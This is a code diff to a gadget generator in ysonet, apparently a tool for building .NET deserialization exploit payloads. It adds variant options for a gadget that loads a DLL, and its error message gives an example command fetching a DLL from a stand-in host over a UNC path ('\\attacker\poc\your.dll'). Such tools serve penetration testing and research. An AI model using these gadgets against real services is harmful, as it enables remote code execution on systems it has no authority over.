@@ -38,6 +38,22 @@ namespace ysonet.Generators
             return "Remote DLL loading gadget for .NET 5/6/7 with WPF enabled (mixed DLL). Local DLL loading for .NET Framework if System.CodeDom is available. DLL path delivered with -c argument";
         }
 
+        public override CommandInputType CommandInput()
+        {
+            return CommandInputType.DllPath;
+        }
+
+        public override List<GadgetVariant> Variants()
+        {
+            return new List<GadgetVariant>
+            {
+                new GadgetVariant(1, "PropertyGrid getter (default)"),
+                new GadgetVariant(2, "ComboBox getter (may load DLL twice)"),
+                new GadgetVariant(3, "ListBox getter"),
+                new GadgetVariant(4, "CheckedListBox getter")
+            };
+        }
+
         public override OptionSet Options()
         {
             OptionSet options = new OptionSet()
@@ -64,8 +80,7 @@ namespace ysonet.Generators
 
             if (!inputArgs.CmdFullString.ToLowerInvariant().EndsWith(".dll"))
             {
-                Console.WriteLine("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysonet.exe -g GetterCompilerResults -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
-                Environment.Exit(-1);
+                throw new Exception("This gadget loads remote (.NET 5/6/7) or local file (.NET Framework, if System.CodeDom is available): -c argument should provide a file path to your mixed DLL file, which needs to end with the \".dll\"\r\nUNC paths can be used for the remote DLL loading, like \\\\attacker\\poc\\your.dll\r\nIf you want to deliver file with a different extension than .dll, please modify the gadget manually\r\nExample: ysonet.exe -g GetterCompilerResults -f Json.NET -c '\\\\attacker\\poc\\your.dll'");
             }
 
             if (formatter.ToLower().Equals("json.net"))
